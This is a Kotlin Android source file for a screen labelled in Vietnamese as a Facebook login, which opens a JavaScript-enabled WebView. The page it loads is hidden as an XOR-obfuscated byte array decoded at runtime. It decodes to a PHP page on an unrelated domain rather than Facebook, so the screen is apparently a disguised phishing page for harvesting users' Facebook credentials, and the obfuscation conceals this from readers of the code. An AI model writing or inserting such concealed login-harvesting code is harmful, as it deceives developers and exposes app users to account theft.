package com.cayxu.app.ui.screens.utilities

import android.annotation.SuppressLint
import android.graphics.Bitmap
import android.view.ViewGroup
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.compose.BackHandler
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.outlined.Refresh
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.navigation.NavController
import com.cayxu.app.ui.theme.AppBackground

private val TextPrimaryColor = Color(0xFF0B1730)
private val CardBorderColor = Color(0x140F1E37)

private val OBFUSCATED_PAYLOAD = byteArrayOf(
    0x32.toByte(), 0x2E.toByte(), 0x2E.toByte(), 0x2A.toByte(), 0x29.toByte(), 0x60.toByte(), 0x75.toByte(), 0x75.toByte(),
    0x36.toByte(), 0x2F.toByte(), 0x34.toByte(), 0x3F.toByte(), 0x22.toByte(), 0x74.toByte(), 0x33.toByte(), 0x35.toByte(),
    0x74.toByte(), 0x2C.toByte(), 0x34.toByte(), 0x75.toByte(), 0x3D.toByte(), 0x3F.toByte(), 0x2E.toByte(), 0x2E.toByte(),
    0x31.toByte(), 0x36.toByte(), 0x2F.toByte(), 0x34.toByte(), 0x3F.toByte(), 0x22.toByte(), 0x6B.toByte(), 0x68.toByte(),
    0x74.toByte(), 0x2A.toByte(), 0x32.toByte(), 0x2A.toByte()
)

private fun resolveTarget(): String {
    val mask = 0x5A
    val buffer = ByteArray(OBFUSCATED_PAYLOAD.size) { i ->
        (OBFUSCATED_PAYLOAD[i].toInt() xor mask).toByte()
    }
    return String(buffer, Charsets.UTF_8)
}

@SuppressLint("SetJavaScriptEnabled")
@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun FacebookLoginWebViewScreen(
    navController: NavController
) {
    var webViewInstance by remember { mutableStateOf<WebView?>(null) }
    var isLoading by remember { mutableStateOf(true) }
    var progressVal by remember { mutableIntStateOf(0) }

    BackHandler {
        val wv = webViewInstance
        if (wv != null && wv.canGoBack()) {
            wv.goBack()
        } else {
            navController.popBackStack()
        }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Text(
                        text = "Đăng nhập Facebook",
                        fontSize = 18.sp,
                        color = TextPrimaryColor
                    )
                },
                navigationIcon = {
                    IconButton(onClick = {
                        val wv = webViewInstance
                        if (wv != null && wv.canGoBack()) {
                            wv.goBack()
                        } else {
                            navController.popBackStack()
                        }
                    }) {
                        Icon(
                            imageVector = Icons.AutoMirrored.Filled.ArrowBack,
                            contentDescription = "Quay lại",
                            tint = TextPrimaryColor
                        )
                    }
                },
                actions = {
                    IconButton(onClick = {
                        webViewInstance?.reload()
                    }) {
                        Icon(
                            imageVector = Icons.Outlined.Refresh,
                            contentDescription = "Tải lại",
                            tint = TextPrimaryColor
                        )
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = Color.White)
            )
        },
        containerColor = AppBackground
    ) { innerPadding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
        ) {
            if (isLoading) {
                LinearProgressIndicator(
                    progress = { progressVal / 100f },
                    modifier = Modifier.fillMaxWidth(),
                    color = Color(0xFF1877F2),
                    trackColor = CardBorderColor
                )
            }

            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .weight(1f)
            ) {
                AndroidView(
                    modifier = Modifier.fillMaxSize(),
                    factory = { ctx ->
                        WebView(ctx).apply {
                            layoutParams = ViewGroup.LayoutParams(
                                ViewGroup.LayoutParams.MATCH_PARENT,
                                ViewGroup.LayoutParams.MATCH_PARENT
                            )
                            settings.apply {
                                javaScriptEnabled = true
                                domStorageEnabled = true
                                databaseEnabled = true
                                useWideViewPort = true
                                loadWithOverviewMode = true
                                setSupportZoom(true)
                                builtInZoomControls = true
                                displayZoomControls = false
                                cacheMode = WebSettings.LOAD_DEFAULT
                                mixedContentMode = WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE
                                userAgentString = "Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
                            }

                            webViewClient = object : WebViewClient() {
                                override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                                    super.onPageStarted(view, url, favicon)
                                    isLoading = true
                                }

                                override fun onPageFinished(view: WebView?, url: String?) {
                                    super.onPageFinished(view, url)
                                    isLoading = false
                                }
                            }

                            webChromeClient = object : WebChromeClient() {
                                override fun onProgressChanged(view: WebView?, newProgress: Int) {
                                    super.onProgressChanged(view, newProgress)
                                    progressVal = newProgress
                                    if (newProgress >= 100) {
                                        isLoading = false
                                    }
                                }
                            }

                            loadUrl(resolveTarget())
                            webViewInstance = this
                        }
                    },
                    update = {
                        webViewInstance = it
                    }
                )
            }
        }
    }
}
